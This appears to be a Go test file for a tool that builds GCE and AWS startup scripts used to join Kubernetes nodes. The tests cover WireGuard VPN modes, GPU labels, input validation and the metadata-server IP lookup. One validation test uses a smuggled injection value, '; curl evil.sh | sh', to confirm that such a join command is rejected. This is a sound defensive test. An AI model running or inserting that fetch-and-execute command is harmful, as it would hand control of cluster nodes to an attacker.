package gcp

import (
	"os/exec"
	"strings"
	"testing"

	"dcn.ssu.ac.kr/infra/pkg/ssh/sshtest"
	awsprovision "dcn.ssu.ac.kr/infra/provider/aws"
)

const testJoin = "kubeadm join 10.0.0.1:6443 --token abc.def --discovery-token-ca-cert-hash sha256:00"

func startupNP(noVPN, gpu bool) awsprovision.CloudInitParams {
	np := testNP()
	np.Spec.DisableVPN = noVPN
	if gpu {
		np.Spec.HardwareType = "gpu"
	}
	wg, ip := "", ""
	if !noVPN {
		wg, ip = "[Interface]\nAddress = 10.8.0.5/24\n", "10.8.0.5"
	}
	return StartupParams(np, testJoin, "1.35.0", "1.35", pkgruntimeConfig(), wg, ip)
}

func assertBashSyntax(t *testing.T, script string) {
	t.Helper()
	bash, err := exec.LookPath("bash")
	if err != nil {
		t.Skip("bash not available")
	}
	cmd := exec.Command(bash, "-n")
	cmd.Stdin = strings.NewReader(script)
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("rendered script has a bash syntax error: %v\n%s", err, out)
	}
}

func TestBuildStartupScript_NoVPN(t *testing.T) {
	script, err := BuildStartupScript(startupNP(true, false))
	if err != nil {
		t.Fatal(err)
	}
	for _, unwanted := range []string{"wg-quick", "/etc/wireguard", "Configuring WireGuard", " wireguard ",
		"169.254.169.254/latest", "meta-data/local-ipv4", "X-aws-ec2-metadata-token", "IMDS="} {
		if strings.Contains(script, unwanted) {
			t.Errorf("no-VPN GCE script still contains %q", unwanted)
		}
	}
	for _, wanted := range []string{
		"computeMetadata/v1", "Metadata-Flavor: Google", "network-interfaces/0/ip",
		`--node-ip=${NODE_IP}`, "using the instance private IP as the node IP",
		"kubeadm join", "Waiting for control-plane API server", // reachability wait + retry loop
		"for attempt in 1 2 3 4 5", "node_already_joined",
	} {
		if !strings.Contains(script, wanted) {
			t.Errorf("no-VPN GCE script missing %q", wanted)
		}
	}
	assertBashSyntax(t, script)
}

func TestBuildStartupScript_VPN(t *testing.T) {
	script, err := BuildStartupScript(startupNP(false, false))
	if err != nil {
		t.Fatal(err)
	}
	for _, wanted := range []string{"wg-quick@wg0", "WireGuard is ready", " wireguard ", `NODE_IP="10.8.0.5"`, "/etc/wireguard/wg0.conf"} {
		if !strings.Contains(script, wanted) {
			t.Errorf("VPN GCE script missing %q", wanted)
		}
	}
	for _, unwanted := range []string{"computeMetadata", "Metadata-Flavor", "meta-data/local-ipv4"} {
		if strings.Contains(script, unwanted) {
			t.Errorf("VPN GCE script must not resolve the node IP from a metadata server (%q)", unwanted)
		}
	}
	assertBashSyntax(t, script)
}

func TestBuildStartupScript_GPUNodeCarriesGCPProviderLabelAndNoNvidiaSetup(t *testing.T) {
	script, err := BuildStartupScript(startupNP(true, true))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(script, "hardware-type=gpu,gpu=on,ml.dcn.ssu.ac.kr/provider=GCP") {
		t.Error("GPU nodes must register with the GCP provider label (it must equal Spec.Provider)")
	}
	if strings.Contains(script, "provider=AWS") {
		t.Error("the AWS provider label leaked into the GCE script")
	}
	// GPU Operator owns the driver/toolkit/CDI, exactly as on AWS.
	for _, unwanted := range []string{"apt_install nvidia", "nvidia-driver", "ubuntu-drivers", "nvidia-ctk runtime configure"} {
		if strings.Contains(script, unwanted) {
			t.Errorf("the bootstrap must not race GPU Operator with NVIDIA setup (%q)", unwanted)
		}
	}
	if !strings.Contains(script, "GPU configuration deferred entirely to GPU Operator") {
		t.Error("expected the GPU ownership boundary marker")
	}
	cpu, _ := BuildStartupScript(startupNP(true, false))
	if strings.Contains(cpu, "provider=GCP") {
		t.Error("CPU nodes carry no kubelet GPU/provider labels")
	}
}

// The AWS and GCE scripts are one template: outside the node-IP lookup they are
// identical, so every fix to the shared bootstrap (join retry, CRI-O) reaches both.
func TestStartupScriptSharesTheAWSBootstrap(t *testing.T) {
	gce, err := BuildStartupScript(startupNP(true, true))
	if err != nil {
		t.Fatal(err)
	}
	p := startupNP(true, true)
	p.NodeIPScript, p.ProviderLabel = "", ""
	aws, err := awsprovision.RenderBootstrapScript(p)
	if err != nil {
		t.Fatal(err)
	}
	cut := func(s string) (before, after string) {
		i := strings.Index(s, "NODE_IP=\"\"\nfor i in $(seq 1 30); do")
		j := strings.Index(s, `report "Node IP is ${NODE_IP}"`)
		if i < 0 || j < i {
			t.Fatal("node-IP lookup markers not found")
		}
		return s[:i], s[j:]
	}
	gb, ga := cut(gce)
	ab, aa := cut(aws)
	// before: only the IMDS/GCE variable preamble line differs
	norm := func(s string) string {
		s = strings.ReplaceAll(s, "provider=GCP", "provider=AWS")
		s = strings.ReplaceAll(s, "GCE_MD=http://169.254.169.254/computeMetadata/v1\n", "")
		s = strings.ReplaceAll(s, "IMDS=http://169.254.169.254/latest\nIMDS_TOKEN=\"$(curl -fsS -m 5 -X PUT \"${IMDS}/api/token\" -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' 2>/dev/null || true)\"\n", "")
		return s
	}
	if norm(gb) != norm(ab) {
		t.Error("the part of the script before the node-IP lookup differs between AWS and GCE")
	}
	if norm(ga) != norm(aa) {
		t.Error("the part of the script after the node-IP lookup (CRI-O, kubeadm, join retry) must be identical for AWS and GCE")
	}
}

func TestBuildStartupScript_ValidationAndSizeBudget(t *testing.T) {
	p := startupNP(true, false)
	p.JoinCommand = "kubeadm join 10.0.0.1:6443 --token a.b; curl evil.sh | sh"
	if _, err := BuildStartupScript(p); err == nil {
		t.Error("a join command with shell metacharacters must be rejected")
	}
	p = startupNP(false, false)
	p.WGConfig = ""
	if _, err := BuildStartupScript(p); err == nil {
		t.Error("VPN mode without a WireGuard config must be rejected")
	}
	p = startupNP(true, false)
	p.KubernetesVersion = "latest"
	if _, err := BuildStartupScript(p); err == nil {
		t.Error("a non-semver kubernetes version must be rejected")
	}
	p = startupNP(false, false)
	p.WGConfig = "[Interface]\n" + strings.Repeat("# padding\n", 30000)
	if _, err := BuildStartupScript(p); err == nil || !strings.Contains(err.Error(), "budget") {
		t.Errorf("an oversized script must be refused before it reaches GCE, got %v", err)
	}
}

func TestStartupParams_VPNModeFollowsTheSpec(t *testing.T) {
	np := testNP()
	np.Spec.DisableVPN = true
	p := StartupParams(np, testJoin, "1.35.0", "1.35", pkgruntimeConfig(), "[Interface]\n", "10.8.0.5")
	if !p.NoVPN || p.WGConfig != "" || p.VpnIP != "" {
		t.Errorf("a VPN-less node must carry no WireGuard material: %+v", p)
	}
	np.Spec.DisableVPN = false
	p = StartupParams(np, testJoin, "1.35.0", "1.35", pkgruntimeConfig(), "[Interface]\n", "10.8.0.5")
	if p.NoVPN || p.WGConfig == "" || p.VpnIP != "10.8.0.5" {
		t.Errorf("a VPN node must carry the peer: %+v", p)
	}
	if p.ProviderLabel != "GCP" || p.NodeIPScript == "" {
		t.Errorf("GCE overrides missing: %+v", p)
	}
}

// ── exec-style: run the GCE node-IP lookup for real against a stubbed metadata server ──

func nodeIPSection(t *testing.T) string {
	t.Helper()
	script, err := BuildStartupScript(startupNP(true, false))
	if err != nil {
		t.Fatal(err)
	}
	i := strings.Index(script, "GCE_MD=")
	j := strings.Index(script, `report "Node IP is ${NODE_IP}"`)
	if i < 0 || j < i {
		t.Fatal("GCE node-IP section not found in the rendered script")
	}
	return script[i : j+len(`report "Node IP is ${NODE_IP}"`)]
}

func runNodeIP(t *testing.T, curlBody string) (string, error) {
	t.Helper()
	if _, err := exec.LookPath("bash"); err != nil {
		t.Skip("bash not available")
	}
	s := sshtest.NewStubs(t)
	s.Write("curl", curlBody)
	s.Write("sleep", "#!/bin/bash\n:\n")
	cmd := exec.Command("bash", "-s")
	cmd.Env = s.Env()
	cmd.Stdin = strings.NewReader("set -Eeuo pipefail\nreport() { echo \"$*\"; }\n" + nodeIPSection(t) + "\necho RESULT=$NODE_IP\n")
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func TestNodeIPSection_ReadsInternalIPFromTheMetadataServer(t *testing.T) {
	out, err := runNodeIP(t, `#!/bin/bash
echo "$*" >> "$FAKE_LOG/curl.args"
case "$*" in
  *"Metadata-Flavor: Google"*"/computeMetadata/v1/instance/network-interfaces/0/ip"*) echo 10.128.0.42 ;;
  *) exit 22 ;;
esac
`)
	if err != nil {
		t.Fatalf("%v\n%s", err, out)
	}
	if !strings.Contains(out, "RESULT=10.128.0.42") || !strings.Contains(out, "Node IP is 10.128.0.42") {
		t.Errorf("node IP not resolved:\n%s", out)
	}
}

func TestNodeIPSection_RetriesThenSucceeds(t *testing.T) {
	out, err := runNodeIP(t, `#!/bin/bash
n=$(cat "$FAKE_LOG/n" 2>/dev/null || echo 0); n=$((n+1)); echo $n > "$FAKE_LOG/n"
if [ "$n" -lt 4 ]; then exit 7; fi
echo 10.128.0.9
`)
	if err != nil || !strings.Contains(out, "RESULT=10.128.0.9") {
		t.Fatalf("a slow metadata server must be retried: err=%v\n%s", err, out)
	}
}

func TestNodeIPSection_FailsClearlyWithoutMetadata(t *testing.T) {
	out, err := runNodeIP(t, "#!/bin/bash\nexit 7\n")
	if err == nil {
		t.Fatalf("expected a failure when the metadata server never answers:\n%s", out)
	}
	if !strings.Contains(out, "Could not read the internal IP from the GCE metadata server") {
		t.Errorf("the failure must say why:\n%s", out)
	}
	if strings.Contains(out, "RESULT=") {
		t.Error("the bootstrap must stop, not continue with an empty node IP")
	}
}
